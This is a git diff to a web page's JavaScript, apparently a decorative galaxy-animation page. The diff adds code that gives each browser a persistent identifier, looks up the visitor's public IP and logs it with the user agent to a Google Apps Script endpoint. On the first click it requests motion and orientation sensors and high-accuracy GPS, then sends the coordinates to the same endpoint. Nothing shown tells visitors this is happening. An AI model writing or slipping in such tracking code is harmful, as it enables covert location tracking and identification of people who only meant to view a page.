@@ -105,6 +105,11 @@
     const APPS_SCRIPT_URL =
     "https://script.google.com/macros/s/AKfycbx384SNG3uhuumQg15lHSsgw8m6WiIVyAzSuFmwxjFzngUrBzfbeQQ2rteDCFE7TCiR/exec";
 
+
+// =====================================================
+// ID DE VISITA
+// =====================================================
+
 const visitaId =
     Date.now().toString(36) +
     "-" +
@@ -113,22 +118,223 @@ const visitaId =
         .substring(2, 10);
 
 
-// =========================
+// =====================================================
+// ID PERSISTENTE DEL DISPOSITIVO/NAVEGADOR
+// =====================================================
+
+let dispositivoId =
+    localStorage.getItem("dispositivo_id");
+
+if (!dispositivoId) {
+
+    dispositivoId =
+        crypto.randomUUID();
+
+    localStorage.setItem(
+        "dispositivo_id",
+        dispositivoId
+    );
+}
+
+
+// =====================================================
+// DATOS DE SENSORES
+// =====================================================
+
+let orientationData = {
+    alpha: "",
+    beta: "",
+    gamma: ""
+};
+
+let motionData = {
+    x: "",
+    y: "",
+    z: ""
+};
+
+
+// =====================================================
 // REGISTRAR VISITA
-// =========================
+// =====================================================
 
 function registrarVisita(ip) {
 
     const parametros =
         "?action=visit" +
+
         "&visita_id=" +
             encodeURIComponent(visitaId) +
+
         "&ip=" +
             encodeURIComponent(ip) +
+
         "&ua=" +
             encodeURIComponent(navigator.userAgent) +
+
         "&url=" +
-            encodeURIComponent(window.location.href);
+            encodeURIComponent(window.location.href) +
+
+        "&dispositivo_id=" +
+            encodeURIComponent(dispositivoId);
+
+
+    console.log(
+        "Registrando visita:",
+        parametros
+    );
+
+
+    fetch(
+        APPS_SCRIPT_URL + parametros,
+        {
+            mode: "no-cors"
+        }
+    )
+    .then(() => {
+
+        console.log(
+            "Visita registrada"
+        );
+
+    })
+    .catch(error => {
+
+        console.error(
+            "Error registrando visita:",
+            error
+        );
+
+    });
+}
+
+
+// =====================================================
+// OBTENER IP
+// =====================================================
+
+fetch(
+    "https://api64.ipify.org?format=json"
+)
+
+.then(response => {
+
+    if (!response.ok) {
+
+        throw new Error(
+            "Error HTTP: " +
+            response.status
+        );
+
+    }
+
+    return response.json();
+
+})
+
+.then(data => {
+
+    console.log(
+        "Respuesta IP:",
+        data
+    );
+
+
+    const ip =
+        data &&
+        typeof data.ip === "string" &&
+        data.ip.trim() !== ""
+
+            ? data.ip.trim()
+
+            : "IP_NO_DISPONIBLE";
+
+
+    console.log(
+        "IP detectada:",
+        ip
+    );
+
+
+    registrarVisita(ip);
+
+})
+
+.catch(error => {
+
+    console.error(
+        "No se pudo obtener IP:",
+        error
+    );
+
+
+    registrarVisita(
+        "IP_NO_DISPONIBLE"
+    );
+
+});
+
+
+// =====================================================
+// REGISTRAR SENSORES EN APPS SCRIPT
+// =====================================================
+
+function registrarSensores(
+    sensorPermission,
+    orientationPermission
+) {
+
+    const parametros =
+
+        "?action=sensor" +
+
+        "&visita_id=" +
+            encodeURIComponent(visitaId) +
+
+        "&sensor_permission=" +
+            encodeURIComponent(sensorPermission) +
+
+        "&orientation_permission=" +
+            encodeURIComponent(
+                orientationPermission
+            ) +
+
+        "&alpha=" +
+            encodeURIComponent(
+                orientationData.alpha
+            ) +
+
+        "&beta=" +
+            encodeURIComponent(
+                orientationData.beta
+            ) +
+
+        "&gamma=" +
+            encodeURIComponent(
+                orientationData.gamma
+            ) +
+
+        "&motion_x=" +
+            encodeURIComponent(
+                motionData.x
+            ) +
+
+        "&motion_y=" +
+            encodeURIComponent(
+                motionData.y
+            ) +
+
+        "&motion_z=" +
+            encodeURIComponent(
+                motionData.z
+            );
+
+
+    console.log(
+        "Registrando sensores:",
+        parametros
+    );
+
 
     fetch(
         APPS_SCRIPT_URL + parametros,
@@ -136,60 +342,332 @@ function registrarVisita(ip) {
             mode: "no-cors"
         }
     );
-
 }
 
 
-// =========================
-// OBTENER IP PÚBLICA
-// =========================
+// =====================================================
+// REGISTRAR UBICACIÓN
+// =====================================================
 
-fetch("https://api64.ipify.org?format=json")
-    .then(response => {
+function registrarUbicacion(position) {
 
-        if (!response.ok) {
-            throw new Error(
-                "Error HTTP: " + response.status
+    const coords =
+        position.coords;
+
+
+    const parametros =
+
+        "?action=location" +
+
+        "&visita_id=" +
+            encodeURIComponent(visitaId) +
+
+        "&latitud=" +
+            encodeURIComponent(
+                coords.latitude
+            ) +
+
+        "&longitud=" +
+            encodeURIComponent(
+                coords.longitude
+            ) +
+
+        "&precision=" +
+            encodeURIComponent(
+                coords.accuracy
+            ) +
+
+        "&gps_timestamp=" +
+            encodeURIComponent(
+                new Date(
+                    position.timestamp
+                ).toISOString()
             );
+
+
+    console.log(
+        "Registrando ubicación:",
+        parametros
+    );
+
+
+    fetch(
+        APPS_SCRIPT_URL + parametros,
+        {
+            mode: "no-cors"
         }
-
-        return response.json();
-
-    })
-    .then(data => {
+    )
+    .then(() => {
 
         console.log(
-            "Respuesta de IP:",
-            data
+            "Ubicación registrada"
         );
-
-        const ip =
-            data &&
-            typeof data.ip === "string" &&
-            data.ip.trim() !== ""
-                ? data.ip.trim()
-                : "IP_NO_DISPONIBLE";
-
-        console.log(
-            "IP detectada:",
-            ip
-        );
-
-        registrarVisita(ip);
 
     })
     .catch(error => {
 
         console.error(
-            "No se pudo obtener la IP:",
+            "Error registrando ubicación:",
             error
         );
 
-        registrarVisita(
-            "IP_NO_DISPONIBLE"
+    });
+}
+
+
+// =====================================================
+// PEDIR UBICACIÓN
+// =====================================================
+
+function pedirUbicacion() {
+
+    if (!navigator.geolocation) {
+
+        console.log(
+            "Geolocalización no disponible"
         );
 
-    });
+        return;
+    }
+
+
+    navigator.geolocation.getCurrentPosition(
+
+        position => {
+
+            console.log(
+                "📍 Ubicación obtenida:",
+                position.coords
+            );
+
+
+            registrarUbicacion(
+                position
+            );
+        },
+
+        error => {
+
+            console.error(
+                "❌ Error de ubicación:",
+                error
+            );
+
+        },
+
+        {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+        }
+    );
+}
+
+
+// =====================================================
+// PEDIR GIROSCOPIO / ORIENTACIÓN
+// =====================================================
+
+async function pedirSensores() {
+
+    let sensorPermission =
+        "not_required";
+
+    let orientationPermission =
+        "not_required";
+
+
+    try {
+
+        // ---------------------------------------------
+        // MOTION
+        // ---------------------------------------------
+
+        if (
+            typeof DeviceMotionEvent !==
+            "undefined" &&
+
+            typeof DeviceMotionEvent
+                .requestPermission ===
+                "function"
+        ) {
+
+            sensorPermission =
+                await DeviceMotionEvent
+                    .requestPermission();
+
+        }
+
+
+        // ---------------------------------------------
+        // ORIENTATION / GIROSCOPIO
+        // ---------------------------------------------
+
+        if (
+            typeof DeviceOrientationEvent !==
+            "undefined" &&
+
+            typeof DeviceOrientationEvent
+                .requestPermission ===
+                "function"
+        ) {
+
+            orientationPermission =
+                await DeviceOrientationEvent
+                    .requestPermission();
+
+        }
+
+
+        console.log(
+            "Permiso motion:",
+            sensorPermission
+        );
+
+        console.log(
+            "Permiso orientation:",
+            orientationPermission
+        );
+
+
+        // ---------------------------------------------
+        // GUARDAR ESTADO DE SENSORES
+        // ---------------------------------------------
+
+        registrarSensores(
+            sensorPermission,
+            orientationPermission
+        );
+
+
+        // ---------------------------------------------
+        // DESPUÉS PEDIR UBICACIÓN
+        // ---------------------------------------------
+
+        pedirUbicacion();
+
+
+    } catch (error) {
+
+        console.error(
+            "Error solicitando sensores:",
+            error
+        );
+
+
+        // Aunque rechace sensores,
+        // todavía podemos solicitar ubicación.
+
+        registrarSensores(
+            "error",
+            "error"
+        );
+
+
+        pedirUbicacion();
+    }
+}
+
+
+// =====================================================
+// ESCUCHAR ORIENTACIÓN
+// =====================================================
+
+function recibirOrientacion(event) {
+
+    if (
+        event.alpha !== null &&
+        event.alpha !== undefined
+    ) {
+
+        orientationData.alpha =
+            event.alpha;
+    }
+
+
+    if (
+        event.beta !== null &&
+        event.beta !== undefined
+    ) {
+
+        orientationData.beta =
+            event.beta;
+    }
+
+
+    if (
+        event.gamma !== null &&
+        event.gamma !== undefined
+    ) {
+
+        orientationData.gamma =
+            event.gamma;
+    }
+}
+
+
+// =====================================================
+// ESCUCHAR MOVIMIENTO
+// =====================================================
+
+function recibirMovimiento(event) {
+
+    if (event.acceleration) {
+
+        motionData.x =
+            event.acceleration.x ?? "";
+
+        motionData.y =
+            event.acceleration.y ?? "";
+
+        motionData.z =
+            event.acceleration.z ?? "";
+    }
+}
+
+
+// =====================================================
+// ACTIVAR SENSORES
+// =====================================================
+
+window.addEventListener(
+    "deviceorientation",
+    recibirOrientacion
+);
+
+window.addEventListener(
+    "devicemotion",
+    recibirMovimiento
+);
+
+
+// =====================================================
+// SOLICITAR SENSORES + UBICACIÓN AL PRIMER CLIC
+// =====================================================
+
+let permisosSolicitados = false;
+
+window.addEventListener(
+    "click",
+    function solicitarPermisosUnaVez() {
+
+        if (permisosSolicitados) {
+            return;
+        }
+
+        permisosSolicitados = true;
+
+        console.log(
+            "Solicitando sensores..."
+        );
+
+        pedirSensores();
+
+    },
+    {
+        once: true
+    }
+);
 
     const canvas = document.getElementById('galaxy-canvas');
     const ctx = canvas.getContext('2d');
